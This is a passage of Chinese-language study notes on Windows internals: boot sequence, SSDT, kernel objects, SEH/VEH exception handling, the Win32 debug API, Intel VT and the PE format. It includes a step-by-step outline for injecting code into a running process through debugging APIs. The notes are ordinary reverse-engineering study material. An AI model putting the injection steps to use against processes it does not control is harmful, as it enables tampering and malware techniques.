ontrolSet\Services</code>下查找“Start”值小于4的设备驱动（该值越小启动越早，4不被允许启动）</li></ul></li><li>Windows会话管理启动：驱动加载后内核会启动会话管理器，smss.exe，是第一个创建的用户模式进程<ul><li>创建系统环境变量</li><li>加载win32k.sys，它是win子系统的内核模式部分</li><li>启动csrss.exe是子系统的用户模式</li><li>启动winlogon.exe</li><li>创建虚拟内存页面文件</li><li>执行上次重启前没完成的重命名工作</li></ul></li><li>登录：由子系统启动的winlogon.exe提供对win用户的登录和注销支持<ul><li>启动服务子系统service.exe，即服务控制管理器</li><li>启动本地安全授权LSA过程lsass.exe</li><li>显示登陆界面</li></ul></li></ol><blockquote><p>win7与xp启动过程区别：ntldr替换为Bootmgr，之后Bootmgr寻找活动分区boot文件夹中的启动配置数据BCD文件，读取并组成启动菜单，显示多操作系统选择的画面。选择win7后，读取windows\system32\winload.exe，并转交控制权，由其加载内核硬件服务等</p><p>UEFI和GPT：替代BIOS和MBR，突破了分区容量的限制（实际上win对GPT分区数限制在128以内）。UEFI本身相当于一个微型操作系统，其上运行的程序以“.efi”结尾。也就是windows安装程序做成efi后可以从任意位置（分区、U盘等）启动</p></blockquote><p><strong>R3与R0通信</strong>：应用程序调用一个I/O有关API——》该API被封装在应用层某个DLL库中（kernel32.dll或user32.dll）——》更底层函数封装在ntdll.dll中（函数成对出现Nt、Zw开头）完成参数检查工作——》调用中断（int 2Eh或SysEnter指令）从R3进入到R0——》内核ntoskrnl.exe中有<a href="https://baike.baidu.com/item/SSDT/6338082">SSDT</a>，里面存放了与ntdll.dll中对应的SSDT系统服务处理函数，即内核态的Nt函数，与ntdll.dll中函数对应</p><blockquote><p>用户模式调用Zw/Nt开头的函数没有区别</p><p>在内核模式下后者会直接调用对应的函数代码，前者则是通过KiSystemService跳转到对应的代码处。</p><p>PS：这一part太难了，暂时看不懂</p></blockquote><p><strong>内核函数</strong>：调用时需要注意IRQL（中断请求级别）</p><div class="table-container"><table><thead><tr><th>前缀</th><th>注释</th><th>前缀</th><th>注释</th></tr></thead><tbody><tr><td>Ex</td><td>管理层</td><td>Ke</td><td>核心层</td></tr><tr><td>HAL</td><td>硬件抽象层</td><td>Ob</td><td>对象管理</td></tr><tr><td>MM</td><td>内存管理</td><td>Ps</td><td>进程线程管理</td></tr><tr><td>Se</td><td>安全管理</td><td>Io</td><td>I/O管理</td></tr><tr><td>Fs</td><td>文件系统</td><td>Cc</td><td>文件缓存管理</td></tr><tr><td>Cm</td><td>系统配置管理</td><td>Pp</td><td>即插即用管理</td></tr><tr><td>Rtl</td><td>运行时程序库</td><td>Zw/Nt</td><td>对应SSDT服务函数</td></tr><tr><td>Flt</td><td>文件过滤驱动</td><td>Ndis</td><td>网络框架调用</td></tr></tbody></table></div><p><strong>内核驱动模块</strong>：包括巨硬自己的和第三方的，既有硬件的驱动也有软件的驱动。内核驱动在磁盘上是一个扩展名为.sys的遵守PE规范的文件。编译好的驱动执行过程如下：</p><ol><li>创建一个服务。注册表<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xxxxx</code>下建立一个与驱动名称相关的服务键</li><li>对象管理器生成驱动对象（DriverObject）传递给DriverEntry()并执行（）该函数是驱动执行的入口函数，类似于R3中的main</li><li>创建控制设备对象</li><li>创建控制设备符号链接</li><li>如果是过滤驱动则创建过滤设备对象并绑定</li><li>注册特定的分发派遣函数</li><li>其他初始化动作等的注册和初始化</li></ol><h3 id="内核重要结构！！！"><a href="#内核重要结构！！！" class="headerlink" title="内核重要结构！！！"></a>内核重要结构！！！</h3><h4 id="内核对象"><a href="#内核对象" class="headerlink" title="内核对象"></a>内核对象</h4><p>应用层的进程/线程、文件、驱动、事件、信号量或是句柄都在内核之中有对应的内核对象</p><p>内核对象=对象头（至少有一个OBJECT_HEADER和对象额外信息）+对象体（紧接着OBJECT_HEADER）。对象指针总是指向对象体，而非对象头，需要通过指针减去一定偏移。对象体内部一般会有一个type和一个size类型，来表示对象类型和大小。内核对象如下三种：</p><ul><li><p>Dispatcher对象：对象体开始位置有一个DISPATCHER_HEADER数据结构。包含该结构的内核对象都会以K开头，如“KPROCESS”、“KTHREAD”</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DISPACHER_HEADER</span>&#123;</span></span><br><span class="line">UCHARType;</span><br><span class="line">UCHARAbsolute;</span><br><span class="line">UCHARSize;</span><br><span class="line">UCHARInserted;</span><br><span class="line">LONGSignalState;</span><br><span class="line">LIST_ENTRYWaitListHead;</span><br><span class="line">&#125;DISPATCHER_HEADER;</span><br></pre></td></tr></table></figure></li><li><p>I/O对象：在对象体开头位置没有上述结构，但会放置一个与type和size有关的整型成员。常见的<code>DEVICE_OBJECT</code>、<code>DRIVER_OBJECT</code>等</p></li><li><p>其他对象：除了上述两种，剩下的都属于此。两个常用的“EPROCESS”、“ETHREAD”对象。</p><ul><li>EPROCESS用于内核中管理进程的各种信息，每个进程都对应这样一个结构体。所有的EPROCESS都被放入了一个双向链表，R3在枚举系统进程时会通过遍历这个链表来获得进程的列表。其中必定会包含前面的“KPROCESS”结构</li><li>ETHREAD同上，每个线程对应一个，并且也在一个双向链表中管理，其中必定包含一个“KTHREAD”结构</li></ul></li></ul><h4 id="SSDT"><a href="#SSDT" class="headerlink" title="SSDT"></a>SSDT</h4><p>即系统服务描述符表=“KeServiceDescriptorTable”。</p><p>ntdll.dll中的API是一个简单的包装函数——》当kernel32.dll中的API通过ntdll.dll时先完成对参数的检查——》在调用一个中断（int 2Eh或SysEnter指令）从而实现R3到R0——》并将需要调用的服务号（SSDT数组中的索引号index值）放入EAX中——》之后根据EAX索引在SSDT数组中调用指定的服务（Nt函数）</p><p>SSDT表结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ServiceDescriptorEntry</span>&#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> *ServiceTableBase;<span class="comment">//表的基地址</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> *ServiceCounterTableBase;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> NumberOfServices;<span class="comment">//表中服务函数个数</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *ParamTableBase;</span><br><span class="line">&#125;ServiceDescriptorTableEntry_t *PServiceDescriptorTableEntry_t;</span><br></pre></td></tr></table></figure><p>Shadow SSDT和此类似，对应的表名“KeServiceDescriptorTableShadow”，是内核未导出的另一张表（自己不能直接导入引用），包含Ntoskrnel.exe和win32k.sys服务函数，主要处理来自User32.dll和GDI32.dll的系统调用。结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SERVICE_DESCRIPTOR_TABLE</span>&#123;</span></span><br><span class="line">SYSTEM_SERVICE_TABLE ntoskrnl;<span class="comment">//ntoskrnl.exe</span></span><br><span class="line">SYSTEM_SERVICE_TABLE win32k;<span class="comment">//win32k.sys</span></span><br><span class="line">SYSTEM_SERVICE_TABLE Table3;</span><br><span class="line">SYSTEM_SERVICE_TABLE Table4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="TEB-amp-PEB"><a href="#TEB-amp-PEB" class="headerlink" title="TEB&amp;PEB"></a>TEB&amp;PEB</h4><p>TEB线程环境块，和PEB进程环境块，一样不在系统的内核空间中，是应用层的结构。</p><p>进程中除了系统线程外每个线程都有一个自己的TEB，一个进程的所有的TEB都在0x7FFDE000开始的线性地址，每4KB为一个完整的TEB。</p><p><code>NtCurrentTeb</code>可以返回当前线程TEB结构地址，通过其中的成员<code>ProcessEnvironmentBlock</code>可以获得当前进程的PEB地址</p><p>内核结构对象EPROCESS中同样记录了PEB结构地址，ETHREAD同样指向了应用层的TEB</p><blockquote><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/ns-winternl-teb">TEB (winternl.h) - Win32 apps | Microsoft Learn</a></p><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/ns-winternl-peb">PEB (winternl.h) - Win32 apps | Microsoft Learn</a></p></blockquote><h3 id="Win异常处理"><a href="#Win异常处理" class="headerlink" title="Win异常处理"></a>Win异常处理</h3><p>异常处理是OS处理程序错误或异常的一系列流程和技术总称。SEH结构化异常处理；VEH向量化异常处理（winxp以上版本）</p><h4 id="异常处理基本概念"><a href="#异常处理基本概念" class="headerlink" title="异常处理基本概念"></a>异常处理基本概念</h4><p>中断由外部硬件设备或异步事件引起，异常由内部事件产生，包括故障、陷阱、终止。故障陷阱是可恢复的，而终止类异常不可恢复，需要重启</p><p><strong>异常列表</strong>：由CPU引发的异常叫硬件异常，访问无效地址等；由操作系统或程序引发的叫软件异常。</p><div class="table-container"><table><thead><tr><th>中断类型号</th><th>类型</th><th>类型号</th><th>类型</th></tr></thead><tbody><tr><td>00</td><td>除数为0</td><td>01</td><td>调试中断</td></tr><tr><td>03</td><td>断点中断</td><td>04</td><td>溢出中断</td></tr><tr><td>05</td><td>边界检查</td><td>06</td><td>非法指令故障</td></tr><tr><td>07</td><td>设备不可用</td><td>08</td><td>双重故障</td></tr><tr><td>0a</td><td>无效TSS中断</td><td>0b</td><td>段不存在异常</td></tr><tr><td>0c</td><td>栈异常</td><td>0d</td><td>通用保护异常</td></tr><tr><td>0e</td><td>页异常</td><td></td></tr></tbody></table></div><blockquote><p>软件异常还可以由代码主动引起<a href="https://learn.microsoft.com/zh-CN/windows/win32/api/errhandlingapi/nf-errhandlingapi-raiseexception">RaiseException 函数 (errhandlingapi.h) - Win32 apps | Microsoft Learn</a>，程序捕获软件异常的方法与捕获硬件异常的方法完全相同</p></blockquote><p><strong>异常处理的基本过程</strong></p><p>win启动后会运行在保护模式下，中断/异常发生时，CPU通过中断描述符表IDT来寻找处理函数。</p><ol><li><strong>IDT</strong>（下面在32位下说明）</li></ol><p>IDT存在于物理内存中的线性表，共256项，32位下每个IDT项长8字节，64位模式下64字节。OS在启动时会初始化这个表，每个CPU都会有一份该表拷贝。IDTR寄存器共48位=32位表基址+16位表长，可以使用SIDT、LIDT指令读写该寄存器。</p><p>IDT每项都是一个门结构，是中断/异常是CPU转移控制权的地方，包括3种</p><ul><li>任务门描述符，用于CPU的任务切换</li><li>中断门描述符，用于描述中断处理程序的入口</li><li>陷阱门描述符，描述异常处理程序的入口</li></ul><p>中断/异常发生时，CPU根据中断类型号转而执行对应的中断处理程序，也就是IDT表项下对应的函数，各异常处理函数除了对异常处理外还会将异常信息封装，方便后续处理</p><ul><li><p>封装的内容1：<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winnt/ns-winnt-exception_record">EXCEPTION_RECORD (winnt.h) - Win32 apps | Microsoft Learn</a>即异常记录</p></li><li><p>封装的内容2：陷阱帧，用于描述发生异常时线程的状态（win的任务调度基于线程），<code>_KTRAP_FRAME</code>结构体，一般仅供系统内核自身或调试系统使用，当需要将控制权交给用户注册的异常处理程序时，会将该结构转为<a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context">CONTEXT (winnt.h) - Win32 apps | Microsoft Learn</a>结构</p></li></ul><p>包装完后，异常处理函数调用内核<code>KiDispatchException</code>函数来处理异常，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">VOID KiDispatchException&#123;</span><br><span class="line">INPEXCEPTION_RECORD ExceptionRecord,<span class="comment">//异常结构信息</span></span><br><span class="line">INPKEXCEPTION_FRAME ExceptionFrame,<span class="comment">//未使用</span></span><br><span class="line">INPKTRAP_FRAME TrapFrame,<span class="comment">//发生异常时的陷阱帧</span></span><br><span class="line">INKPROCESSOR_MODE PreviousMode,<span class="comment">//异常发生时CPU是内核模式or用户模式</span></span><br><span class="line">INBOOLEAN FirstChance<span class="comment">//是否第一次处理该异常</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内核态异常处理</p><ol><li>检测当前系统是否正被内核调试器调试，存在的话系统会转交控制权，否则跳过。内核调试器取得控制权后会根据用户的设置来确定是否处理该异常，如果没设置就把控制权交给用户。正确处理完之后回到原来的位置继续执行</li><li>若无内核调试器，或在第一次处理时调试器选择不处理，系统就会调用<code>RtlDispatchException</code>函数，根据线程注册的结构化异常处理SEH过程来处理该异常</li><li>如果<code>RtlDispatchException</code>函数没有处理该异常，系统会给调试器第二次处理机会，此时调试器可以再次取得对异常的处理权</li><li>上面两个都不行的话，系统则会认为不能继续运行了，并调用<code>KeBugCheckEx</code>产生蓝屏错误</li></ol><p>用户态异常处理</p><ol><li>如果程序正在被调试则会将异常信息发送给正在调试它的用户态调试器，如果没有被调试则跳过</li><li>不存在用户调试器或没处理，则会在栈上放置<code>EXCEPTION_RECORD</code>和<code>CONTEXT</code>两个结构，并将控制权返回用户态ntdll.dll中的<code>KiUserExceptionDispatcher</code>函数——》<code>RtDispatchException</code>函数进行用户态异常处理。</li><li>如果<code>Rt~</code>未能处理该异常，则会返回<code>Ki~</code>，并再次将异常信息发送给用户态的调试器（没有调试器就调用<code>ExitProcess</code>终结程序）</li></ol><h4 id="SEH说明"><a href="#SEH说明" class="headerlink" title="SEH说明"></a>SEH说明</h4><p>当没有调试器参与异常处理时，主要就是依靠SEH（用户模式和内核模式均可）和VEH（仅支持用户模式）机制</p><p>在程序运行错误时，SEH告诉系统由谁来处理，可以说是系统在终结程序之前提供的一个执行回调函数的机会</p><p><strong>SEH数据结构</strong></p><ul><li><p>TIB线程信息块，用于保存线程基本信息。在用户模式下位于TEB线程环境块头部。<a href="https://www.nirsoft.net/kernel_struct/vista/NT_TIB.html">struct NT_TIB (nirsoft.net)</a></p></li><li><p><code>_EXCEPTION_REGISTRATION_RECORD</code>结构，位于TEB的偏移量0处，主要用于描述线程异常处理过程的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span>&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span>_<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Next</span>;</span><span class="comment">//指向下一个该结构的指针，也叫ERR指针</span></span><br><span class="line">PEXCEPTION_ROUTINE Handler;<span class="comment">//当前异常处理回调函数地址</span></span><br><span class="line">&#125;EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure></li><li><p><code>EXCEPTION_RECORD</code>结构和<code>CONTEXT</code>结构，分别描述异常发生的相关信息和线程状态信息</p></li><li><p><code>_EXCEPTION_POINTERS</code>结构：包括两个指针分别指向上面两个结构体。异常发生且没有调试器时，OS会将异常信息交给用户态的异常处理过程。同一线程在用户态和内核态是不同的栈，会在用户态栈中copy一下上面两个重要结构，并在栈中设置一个本结构体用以指向它们</p></li></ul><p><strong>SEH处理程序的安装卸载</strong></p><p>根据前面的结构体，我们只要在<code>_EXCEPTION_REGISTRATION_RECORD</code>结构链头部插入一个新的结构体就行。在安装SEH处理程序之前，需要一个符合SEH标准的回调函数，然后使用如下代码进行安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assume fs:nothing</span><br><span class="line">pushoffset SEHandler#压入Handler也就是异常处理回调函数地址</span><br><span class="line">pushfs:[0]#压入SEH链表头，相当于*Next</span><br><span class="line">movfs:[0],esp#更新SEH链表头</span><br></pre></td></tr></table></figure><p>SEH卸载类似</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movesp,dword ptr fs:[0]</span><br><span class="line">popdword ptr fs:[0]</span><br></pre></td></tr></table></figure><blockquote><p>SEH异常处理程序原理及设计这部分就不展开了</p></blockquote><h4 id="VEH向量化异常处理"><a href="#VEH向量化异常处理" class="headerlink" title="VEH向量化异常处理"></a>VEH向量化异常处理</h4><p>与SEH类似，通过注册一个回调函数，发生异常时会被系统的异常处理过程调用，可以通过<code>AddVectoredExceptionHandler</code>注册VEH回调函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WINBASEAPI PVOID WINAPI <span class="title function_">AddVectoredExceptionHandler</span><span class="params">(</span></span><br><span class="line"><span class="params">  ULONG                       First,</span></span><br><span class="line"><span class="params">  PVECTORED_EXCEPTION_HANDLER Handler<span class="comment">//回调函数地址</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="comment">//回调函数原型</span></span><br><span class="line">LONG CALLBACK <span class="title function_">VectoredHandler</span><span class="params">(PEXCEPTION_POINTERS ExceptionInfo)</span>;</span><br><span class="line"><span class="comment">//卸载VEH函数,唯一参数是最上面函数的返回值</span></span><br><span class="line">ULONG <span class="title function_">RemoveVectoredExceptionHandler</span><span class="params">(PVOID VectorHandlerHandle)</span>;</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler">AddVectoredExceptionHandler 函数 (errhandlingapi.h) - Win32 apps | Microsoft Learn</a></p></blockquote><p>该回调函数也形成了链表，如果First=0则置于链表尾，非0则放置于VEH链表最前端。</p><p>有异常时获得控制权优先级：调试器&gt;VEH&gt;SEH。VEH和SEH区别</p><ul><li>SEH信息在栈中，且后注册的在链前端；VEH信息存储于ntdll中的独立链表，可以指定链表头or尾</li><li>SEH基于线程，VEH作用于整个进程（旗下的所有线程）</li><li>VEH无需栈展开，只有一次被调的机会。</li></ul><blockquote><p>VCH属于VEH一部分，当SEH无法正常运行（ex：未过安全验证SafeSEH、SEHOP等）或SEH回调函数返回<code>RtIdspatchException</code>函数时才有机会执行</p></blockquote><h4 id="x64平台的异常处理"><a href="#x64平台的异常处理" class="headerlink" title="x64平台的异常处理"></a>x64平台的异常处理</h4><p><strong>原生x64</strong></p><p>新变化：SEH相关数据结构重定义；函数调用约定统一<code>_fastcall</code>。具体实施如下：</p><ol><li><p>提取所有函数起始、结束地址、函数的栈/寄存器操作（书中简称“序幕”操作）、异常处理信息，生成两个表</p><ul><li><p>函数信息表：所有函数在内存中的位置信息。在PE头部的数据目录<code>IMAGE_DIRECOTRY_EXCEPTION_DIRECOTY</code>中就有</p><blockquote><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winnt/ns-winnt-runtime_function">RUNTIME_FUNCTION (winnt.h) - Win32 apps | Microsoft Learn</a></p></blockquote></li></ul></li><li><p>异常发生时，<code>RtDispatchException()</code>根据发生时的rip调用<code>RtLookupFunctionTable()</code>查找rip位于哪个模块的<code>ExceptionTable</code>中</p></li><li><p>调用<code>RtLookupFunctionEntry()</code>查找rip所在的<code>FunctionEntry</code>，并获取它的“序幕”操作信息，从中取得<code>ExceptionHandler</code>规定的函数并执行</p><blockquote><p>x64上该函数通常是<code>_C_specific_handler()</code>。等同于x86上的<code>_except_handler3/4()</code></p></blockquote></li><li><p>该函数根据rip和ScopeTable来定位在哪一个Try块中，然后执行相应的FiterFunc，并根据返回值确定：A-执行HandlerFunc、返回异常点继续；B-查找下一个异常处理函数（需要<code>RtVirtualUnwind()</code>模拟展开）</p><blockquote><p>ScopeTable：该表紧跟于前面的“序幕”操作表，其中包含了try块的开始结束地址、异常函数的Handler函数、FilterFunc、HandlerFunc地址等</p></blockquote></li></ol><p><strong>WOW64下异常分发</strong></p><p>有关的用户模式下dll：</p><ul><li>Wow64.dll：管理进程/线程注册，钩住异常分发和Ntoskrnl.exe导出的基本系统调用，实现文件重定位及注册表重定位</li><li>Wow64Cpu.dll：管理WOW64内部运行的线程的32位CPU环境，针对32-64位的CPU模式互切</li><li>Wow64win.dll：截取Win32k.sys导出的GUI系统调用</li><li>64位ntdll.dll：负责执行真正的系统调用</li></ul><p>Wow64通过上面64位ntdll中的<code>KiUserExceptionDispatcher</code>钩住异常分发——》该函数捕获原生异常信息+用户模式下环境记录——》转换为32位的异常和环境记录——》转交给32位ntdll下<code>KiUserExceptionDispatcher</code>，之后与原生32位中的异常分发过程一致</p><h3 id="Win32调试API"><a href="#Win32调试API" class="headerlink" title="Win32调试API"></a>Win32调试API</h3><blockquote><p>加载/捆绑一个正在运行的程序以供调试，可以获得被调试程序的底层信息，甚至修改内存、线程运行环境等</p></blockquote><h4 id="相关函数说明"><a href="#相关函数说明" class="headerlink" title="相关函数说明"></a>相关函数说明</h4><ul><li>允许调试器恢复之前由于调试事件而挂起的线程<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/debugapi/nf-debugapi-continuedebugevent">ContinueDebugEvent 函数 (debugapi.h)</a></li><li><strong>允许调试器捆绑到一个正在运行的进程上</strong><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/debugapi/nf-debugapi-debugactiveprocess">DebugActiveProcess 函数 (debugapi.h)</a></li><li>调试器卸载<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/debugapi/nf-debugapi-debugactiveprocessstop">DebugActiveProcessStop 函数 (debugapi.h) - Win32 apps | Microsoft Learn</a></li><li>在当前进程产生一个断点异常，如果未在调试下该异常会被系统接管，一般进程终止<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/debugapi/nf-debugapi-debugbreak">DebugBreak 函数 (debugapi.h) | Microsoft Learn</a>等同于插入int 3断点</li><li><strong>指定进程中产生一个异常断点</strong><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-debugbreakprocess">debugBreakProcess 函数 (winbase.h) | Microsoft Learn</a></li><li>调用进程强制退出，控制权转移至调试器，并在推出前产生一个int 3断点<a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-fatalexit">FatalExit 函数 （winbase.h）| Microsoft Learn</a></li><li>刷新指令高速缓存<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-flushinstructioncache">FlushInstructionCache 函数 (processthreadsapi.h) - Win32 apps | Microsoft Learn</a></li><li><strong>获取指定线程执行环境</strong><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext">GetThreadContext 函数 (processthreadsapi.h) - Win32 apps | Microsoft Learn</a></li><li>返回指定选择器和线程的描述符表入口地址<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-getthreadselectorentry">GetThreadSelectorEntry 函数 (winbase.h) </a></li><li>判断是否处在调试环境中<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent">isDebuggerPresent 函数 (debugapi.h) </a></li><li>传递字符串给调试器显示<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/debugapi/nf-debugapi-outputdebugstringa">OutputDebugStringA 函数 (Windows.h) </a></li><li><strong>读取指定进程某区域内数据</strong><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory">ReadProcessMemory 函数 (memoryapi.h) </a></li><li>设置指定线程执行环境<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext">SetThreadContext 函数 (processthreadsapi.h) </a></li><li>等待被调试进程发生调试事件<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/debugapi/nf-debugapi-waitfordebugevent">WaitForDebugEvent 函数 (debugapi.h)</a></li><li><strong>指定进程某区域写入内存</strong><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory 函数 (memoryapi.h)</a></li></ul><h4 id="代码注入进程"><a href="#代码注入进程" class="headerlink" title="代码注入进程"></a>代码注入进程</h4><blockquote><p>注入代码注意栈平衡</p></blockquote><ol><li><p><code>CreateProcess()</code>创建进程设置debug标志；<code>IsDebuggerPresent()</code>查看是否在调试器下运行；<code>DebugActiveProcess()</code>绑定到正在运行的进程</p></li><li><p><code>WaitForDebugEvent()</code>+<code>ContinueDebugEvent()</code>构成调试循环体来等待获取信息-处理-继续线程，并根据<code>WaitForDebugEvent()</code>返回的<code>DEBUG_EVENT</code>来分支判断</p></li><li><p><code>SuspendThread()</code>挂起目标线程</p></li><li><p><code>VirtualProtectEx()</code>修改目标页读写权限</p></li><li><p><code>ReadProcessMemory()</code>读取目标页</p></li><li><p><code>GetThreadContext()</code>保存线程环境</p></li><li><p><code>WriteProcessMemory()</code>写入新的代码页</p><blockquote><p>可以在目标中调用<code>VirtualAlloc()</code>申请额外空间</p></blockquote></li><li><p>新指令最后是一条是int 3，利用此获取系统控制权</p></li><li><p>保存CONTEXT结构的临时拷贝</p></li><li><p>在拷贝中新设置EIP值</p></li><li><p>恢复原线程的执行，执行我们的代码直到int 3被执行，此时程序被捕获，目标线程再次挂起</p></li><li><p>利用<code>WriteProcessMemory()</code>恢复线程原始代码页</p></li><li><p>恢复原始代码页读写属性</p></li><li><p><code>SetThreadContext()</code>恢复线程原始环境</p></li><li><p>恢复原始线程执行</p></li></ol><h3 id="VT技术"><a href="#VT技术" class="headerlink" title="VT技术"></a>VT技术</h3><p>VT指的是Intel的硬件辅助虚拟化技术，处于Ring -1层级。目的是为了提升VMM-虚拟机监视器（win上俗称Hypervisor）的性能。</p><p>该技术提供了一种虚拟机扩展VMX给CPU，在该扩展中CPU多了一个Root模式（仅供VMM食用），而其上运行的系统处于non-Root模式，VMM通过VMCS-虚拟机控制结构，可以捕获系统使用的特权指令和对硬件的访问，此时VM退出，CPU从non-root切换到Root模式，VMM进行控制。</p><p>创建一个VT技术Hypervisor过程大致如下：</p><ol><li>分配VMXOn区域和VMCS控制块（一个VMCS代表一个GuestOS）</li><li>填写VMCS控制块</li><li>调用VMXLaunch指令启动虚拟机</li><li>当产生#VMExit事件时调用<code>VMExitProc()</code>，并处理各种虚拟机陷入消息</li></ol><blockquote><p>Intel为VT技术引入了一系列新指令集。<code>VMXOn</code>打开VT模式，此时CPU处于root模式——》对GuestOS进行配置——》<code>VMLaunch</code>从root模式转入non-root模式——》GuestOS产生Hypervisor感兴趣事件则陷入处理——》<code>VMXOff</code>关闭VT模式</p></blockquote><p>VMCS=4B-版本标志+4B-VMX退出原因指示器+数据区；数据区包括如下六个部分</p><div class="table-container"><table><thead><tr><th>区域</th><th>说明</th></tr></thead><tbody><tr><td>虚拟机状态域</td><td>GuestOS运行时从该区域加载诸如CPU状态等信息，退出时在此处保存状态</td></tr><tr><td>宿主机状态域</td><td>记录所有有关Hypervisor的状态信息，只存储寄存器有关信息。（#VMExit时通过此区域恢复Hypervisor信息）</td></tr><tr><td>虚拟机执行控制域！！</td><td>用于设置推出条件，以及哪些事件会导致陷入，类似于代码段</td></tr><tr><td>虚拟机VMEntry控制域</td><td>控制虚拟机#VMEntry发生时（Hypervisor——》GuestOS）的行为，类似于.init段</td></tr><tr><td>虚拟机VMExit控制域</td><td>在#VMExit后硬件立即要做的事情，类似于.fini段</td></tr><tr><td>虚拟机VMExit信息域</td><td>只读区域，包含最近#VMExit事件的相关信息，算是一种日志</td></tr></tbody></table></div><p>EPT，即扩展页表技术，用于隔离各个GuestOS。在开启EPT的CPU上，GuestOS通过CR3寄存器——》物理地址GuestPA通过EPT机制（EPTP寄存器）——》真实平台物理空间地址HostPA。</p><blockquote><p>EPT类似于分页机制，就是中间多加了一层。最多可以包含4级页表结构</p></blockquote><h3 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h3><p>PE文件中的数据结构一般有32位和64位之分，除了在64位版本中的一些扩展域之外剩下几乎一样</p><p><img src="https://s2.loli.net/2024/08/08/qSL9hFCMET8krt7.png" alt="PE.png"></p><h4 id="PE基本概念（x86）"><a href="#PE基本概念（x86）" class="headerlink" title="PE基本概念（x86）"></a>PE基本概念（x86）</h4><p>文件内容被分割为不同的区块，其中包含着代码或数据，每个区块按照页边界对齐。Windows加载器遍历PE文件并决定文件的哪一部分被映射到内存的某个地方。</p><ul><li>基地址：PE文件通过加载器到内存后，内存中的版本叫“模块”，其开始地址叫”模块句柄“，也叫“基地址”—ImageBase。该值由PE文件本身决定，默认下EXE=400000h、DLL=10000000h。</li><li>虚拟地址：PE被加载器映射到内存中，每个程序都有自己的虚拟空间，这个虚拟空间的地址叫“虚拟地址”—VA</li><li>相对虚拟地址：RVA是内存中相对于PE基地址的偏移，VA=ImageBase+RVA</li><li>文件偏移地址：PE文件在磁盘上时，数据的位置相对于文件头的偏移量，即文件偏移地址/物理地址—File_Offset/RAW_Offset</li></ul><h4 id="MS-DOS头"><a href="#MS-DOS头" class="headerlink" 